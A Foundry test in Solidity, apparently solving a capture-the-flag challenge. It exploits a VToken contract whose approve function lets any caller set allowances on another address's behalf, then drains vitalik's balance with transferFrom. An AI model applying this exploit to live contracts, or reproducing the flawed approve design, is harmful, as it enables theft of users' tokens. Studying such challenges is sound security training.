// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/0.sol";

contract VTokenTest is Test {
    VToken target;
    address player;
    address vitalik = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;  
    function setUp() public {
        target = new VToken();
        player = vm.addr(1);
        vm.deal(player, 100 ether);
    }

    function testComplete() public {
        vm.startPrank(player);
        uint256 balance = target.balanceOf(vitalik);
        emit log_named_uint("vitalik balance", balance);
        target.approve(vitalik, player, 100 ether);
        uint256 balance1 = target.balanceOf(vitalik);
        emit log_named_uint("vitalik balance after approve", balance1);
        uint256 balance2 = target.allowance(vitalik, player);
        emit log_named_uint("player allowance", balance2);
        target.transferFrom(vitalik, player, 100 ether);
        assertEq(target.balanceOf(vitalik), 0);
    }
}
